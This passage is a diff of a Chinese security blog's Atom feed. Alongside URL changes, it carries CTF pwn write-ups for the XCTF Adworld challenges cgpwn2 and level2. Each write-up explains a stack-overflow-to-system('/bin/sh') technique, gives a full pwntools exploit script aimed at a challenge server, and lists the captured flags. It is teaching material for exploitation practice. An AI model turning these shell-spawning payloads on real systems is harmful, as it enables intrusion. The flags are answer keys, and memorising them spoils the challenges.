operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 通过栈溢出调用system函数</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填充4个字节平衡栈，然后将写入“/bin/sh”的地址作为参数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{d4336a51b8192c14138838a676822392}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/3VAoiOGqnNeypxU.png" alt="攻防世界-cgpwn2 8.png"></p>]]></content>
-    
-    
-    <summary type="html">当程序中没有后门函数时，可以向段中写入/bin/sh，然后跳转到system函数将/bin/sh作为参数执行</summary>
-    
-    
-    
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-    
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
-    
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
   </entry>
   
   <entry>
     <title>攻防世界-guess_num</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num/</id>
     <published>2023-03-19T07:23:24.000Z</published>
     <updated>2023-03-29T00:48:55.037Z</updated>
     
@@ -352,19 +329,42 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>攻防世界-cgpwn2</title>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2/</id>
+    <published>2023-03-19T07:23:24.000Z</published>
+    <updated>2023-03-29T00:46:06.321Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><strong><em>当程序中没有后门函数时</em></strong>：<br><mark>可以通过向段中写入 <code>&quot;/bin/sh&quot;</code>，然后通过栈溢出调用 <code>system()</code> 函数将写入的 <code>&quot;/bin/sh&quot;</code> 作为参数执行</mark></p></li><li><p><mark>在调用 <code>system()</code> 函数时，<strong>若想要向其传入参数</strong>，注意填充 <strong>4个 字节</strong> 的数据来平衡栈</mark>，<strong>因为调用 <code>system()</code> 函数的时候要压入一个返回地址</strong>【<em>有时候直接写 p32(0) 也可以，这也是一个 4字节 的数据</em>】</p></li></ul><blockquote><p>为什么要填充 4个 字节？</p></blockquote><ol><li>当程序调用 <code>system()</code> 函数时，会自动去寻找栈底，即 <code>ebp</code> 指向的位置，然后将 <code>ebp+8 字节</code> 的位置的数据当作函数的参数</li><li>如果想将 <code>/bin/sh</code> 作为 <code>system()</code> 函数的参数，就可以在栈溢出的时候，先修改 <code>eip</code> 为 <code>system()</code> 函数的地址，然后填充 <code>4个字节</code> 的垃圾数据，再将 <code>/bin/sh</code> 的地址写入栈上，这样调用 <code>system()</code> 函数的时候，就可以将 <code>/bin/sh</code> 作为参数，然后返回一个 <code>shell</code></li><li>为什么是在 <code>eip</code>【即 <code>system()</code> 函数地址】后面覆盖 <code>4个字节</code> 垃圾数据而不是前面提到的 <code>8个字节</code>？<br> 这是因为当调用 <code>system()</code> 函数的时候，在 <code>system()</code> 函数中会首先执行 <code>push ebp</code> 指令，将 <code>4字节</code> 的 <code>ebp</code> 地址压入栈中，而此时的栈底距离参数 <code>/bin/sh</code> 正好 <code>8字节</code>，所以应该填充 <code>4字节</code> 垃圾数据<br><img src="https://s2.loli.net/2023/03/18/SoGkB1pXuNM9Hvh.png" alt="攻防世界-cgpwn2 0.png"></li></ol><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/53c24fc5522e4a8ea2d9ad0577196b2f">攻防世界-cgpwn2</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/47GXA5cqQbWhKH6.png" alt="攻防世界-cgpwn2 1.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/85zA6Mwbg9ctLRG.png" alt="攻防世界-cgpwn2 2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/k1HcRSt3fLjVKux.png" alt="攻防世界-cgpwn2 3.png"><br>跟进 <code>hello()</code>：<br><img src="https://s2.loli.net/2023/03/18/Ofux8XA2B39paIW.png" alt="攻防世界-cgpwn2 4.png"><br>有两个输入：<code>name</code> 和 <code>s</code>，查看 <code>name</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/Lmj7w5i6pVunSKo.png" alt="攻防世界-cgpwn2 5.png"><br>发现<mark>输入的 <code>name</code> 是存储在 <code>.bss</code> 段上的，不是在栈中</mark><br>查看 <code>s</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/PL1k2cOzNJFgUjS.png" alt="攻防世界-cgpwn2 6.png"><br>可以通过 <code>gets()</code> 函数溢出函数返回值，转而执行其他函数</p></li><li><p>发现后门函数：<br><img src="https://s2.loli.net/2023/03/18/83ULcImpSFXqCi9.png" alt="攻防世界-cgpwn2 7.png"><br>但是这个函数只是执行 <code>echo hehehe</code>，即：打印 <code>hehehe</code>，并不能提供 flag</p></li><li><p><mark>既然输入的 <code>name</code> 可以往 <code>.bss</code> 段上写入数据，因此可以考虑通过 <code>name</code> 往 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code>，然后再通过输入 <code>s</code> 将栈溢出，使程序调用 <code>system()</code> 函数，再将事先写入的 <code>&quot;/bin/sh&quot;</code> 做为 <code>system()</code> 函数的参数，即可 PWN 掉程序</mark></p></li><li><p>就是需要注意：调用 <code>system()</code> 函数后需要需要填充 <strong>4个字节</strong> 的垃圾数据来保持栈的平衡<br>因为调用 <code>system()</code> 函数的时候要压入一个返回地址，需要填充 <strong>4个 字节</strong>；<br>除写 <code>b&#39;a&#39; * 4</code> 之外，还可以写 <code>p32(0)</code>，也可以代表 <strong>4个 字节</strong></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成elf对象</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取system函数的地址</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x0804A080</span>  <span class="token comment"># s在.bss段上写入的地址，地址可以在ida中查看到，要往这里写入“/bin/sh”，然后用system函数调用它</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">65027</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 通过栈溢出调用system函数</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填充4个字节平衡栈，然后将写入“/bin/sh”的地址作为参数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{d4336a51b8192c14138838a676822392}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/3VAoiOGqnNeypxU.png" alt="攻防世界-cgpwn2 8.png"></p>]]></content>
+    
+    
+    <summary type="html">当程序中没有后门函数时，可以向段中写入/bin/sh，然后跳转到system函数将/bin/sh作为参数执行</summary>
+    
+    
+    
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+    
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
+    
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
   <entry>
     <title>攻防世界-hello_pwn</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/</id>
     <published>2023-03-19T07:23:24.000Z</published>
     <updated>2023-03-29T00:51:29.411Z</updated>
     
@@ -375,19 +375,19 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
   <entry>
     <title>攻防世界-int_overflow</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow/</id>
     <published>2023-03-19T07:23:24.000Z</published>
     <updated>2023-03-29T00:55:49.972Z</updated>
     
@@ -398,19 +398,19 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
   <entry>
     <title>攻防世界-level0</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0/</id>
     <published>2023-03-19T07:23:24.000Z</published>
     <updated>2023-03-29T00:59:13.184Z</updated>
     
@@ -421,19 +421,42 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>攻防世界-level2</title>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2/</id>
+    <published>2023-03-19T07:23:24.000Z</published>
+    <updated>2023-03-29T01:06:26.635Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>通过构造 ROP 链，<mark>利用 PLT 表找到 system() 函数的地址，执行 system() 函数</mark></p></li><li><p>&lt;/mark&gt;给 system() 函数构造参数，注意提供函数返回值，<em>保持栈的平衡，需要填充 4个 垃圾数据</em>&lt;/mark&gt;</p></li><li><p>熟悉<mark>使用 exp 获取地址的方法，例如函数的地址、字符串的地址等</mark>；以及<mark>通过 IDA 查看地址的方法</mark>，<strong><em>通过 exp 获取的地址和 IDA 中直接查看的地址是一样的</em></strong></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1ab77c073b4f4524b73e086d063f884e">攻防世界-level2</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/hEpF2m5NqtScRDi.png" alt="攻防世界-level2 1.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行文件：<br><img src="https://s2.loli.net/2023/03/18/gpY9qAnSjwkt7Ur.png" alt="攻防世界-level2 2.png"></p></li><li><p>在 IDA 分析：<br><img src="https://s2.loli.net/2023/03/18/9Q7spCbyUetDFmI.png" alt="攻防世界-level2 3.png"><br>跟进 <code>vulnerable_function()</code>：<br><img src="https://s2.loli.net/2023/03/18/1nldbCxPvzSjkVL.png" alt="攻防世界-level2 4.png"><br>通过 <code>read()</code> 向 <code>buf</code> 写入长度为 0x100 的数据，但是栈中 <code>buf</code> 的长度只有 0x88，可以栈溢出<br>但是没有发现其他执行类似 <code>system(&quot;/bin/sh&quot;)</code> 命令的函数</p></li><li><p>查看字符串发现 “<code>/bin/sh</code>“：<br><img src="https://s2.loli.net/2023/03/18/1WQAi4stcqrj39p.png" alt="攻防世界-level2 5.png"><br><img src="https://s2.loli.net/2023/03/18/hpTQ9quP8twWkcl.png" alt="攻防世界-level2 6.png"><br>只要想办法执行这里的 “<code>/bin/sh</code>“ 即可</p></li><li><p>由于这里给出了 <code>system()</code> 函数，可以利用这个函数执行 sysytem 的命令<br><img src="https://s2.loli.net/2023/03/18/KTeMBRqjnogI7GO.png" alt="攻防世界-level2 7.png"><br>如果将 <code>/bin/sh</code> 作为参数 <code>command</code> 传入 <code>system()</code> 函数，就可以 PWN 掉主机</p></li><li><p>所以<strong>思路</strong>如下：<br> ① 首先需要通过 <code>PLT</code>、<code>GOT</code> 表找到 <code>system()</code> 函数的地址；<br> ② 通过栈溢出实现函数跳转，让程序执行 <code>system()</code> 函数；<br> ③ 再找到 <code>/bin/sh</code> 的地址；<br> ④ 利用 <code>system()</code> 函数将 <code>/bin/sh</code> 执行，就可以实现 PWN 操作</p></li><li><p>查看输入的 buf 在栈中的位置：<br><img src="https://s2.loli.net/2023/03/18/FLMR643pljAaQb1.png" alt="攻防世界-level2 8.png"><br>首先填充 <code>b&#39;a&#39; * (0x88 - 0x00 + 0x04)</code> 个字符，然后接上 <code>system()</code> 函数的地址作为返回值，使程序转而执行 <code>system()</code> 函数</p></li><li><p><mark>至于 <code>system()</code> 函数的地址，可以根据 <code>system_plt_addr = elf.plt[&quot;system&quot;]</code> 从 PLT 表中获取<br>另外，在 IDA 中，直接搜索函数 “system”，可以看到 <code>.plt</code> 段的函数 <code>.system</code> 的地址为 <code>0x08048320</code></mark><br><img src="https://s2.loli.net/2023/03/18/CoumXVFiG6aqeQD.png" alt="攻防世界-level2 9.png"></p></li><li><p><mark>接下来就是给 <code>system()</code> 函数提供参数 <code>/bin/sh</code><br>可以通过 <code>bin_sh_addr = next(elf.search(b&quot;/bin/sh&quot;))</code> 在程序中搜索 <code>/bin/sh</code> 的地址<br>也可以直接在 IDA 中，看到字符串 <code>/bin/sh</code> 的地址为 <code>0x0804A024</code></mark><br><img src="https://s2.loli.net/2023/03/18/tPZeHw4yh8gQGds.png" alt="攻防世界-level2 10.png"></p></li><li><p>注意这里需要用 4 个字节作为 <code>system(&quot;/bin/sh&quot;)</code> 的返回地址，使栈保持平衡</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>     <span class="token comment"># 生成对象elf</span>system_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>     <span class="token comment"># 根据plt表获取system的地址，根据ida可知.plt段指向的.system的地址为0x08048320</span>bin_sh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment"># 在程序中搜寻/bin/sh的地址，根据ida可知地址为0x0804A024</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56085</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口，注意是remote</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt_addr<span class="token punctuation">)</span>    <span class="token comment"># 跳转到system函数的地址，system_plt_addr直接写0x08048320也可以</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填入4个垃圾字符作为返回地址，保持栈平衡，bin_sh_addr直接填0x0804A024也可以</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{437e920e2e285d2484407590036a7d62}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/PYD7Tmt6szAnwBS.png" alt="攻防世界-level2 11.png"></p>]]></content>
+    
+    
+    <summary type="html">发现程序中有/bin/sh，利用PLT表找到system函数的地址，然后给system函数构造参数来执行</summary>
+    
+    
+    
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+    
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
+    
+    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
   <entry>
     <title>攻防世界-level3</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3/</id>
+    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3/"/>
+    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3/</id>
     <published>2023-03-19T07:23:24.000Z</published>
     <updated>2023-03-29T01:09:44.656Z</updated>
     
@@ -444,35 +467,12 @@
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>攻防世界-repeater</title>
-    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/"/>
-    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/</id>
-    <published>2023-03-19T07:23:24.000Z</published>
-    <updated>2023-03-29T01:13:03.763Z</updated>
-    
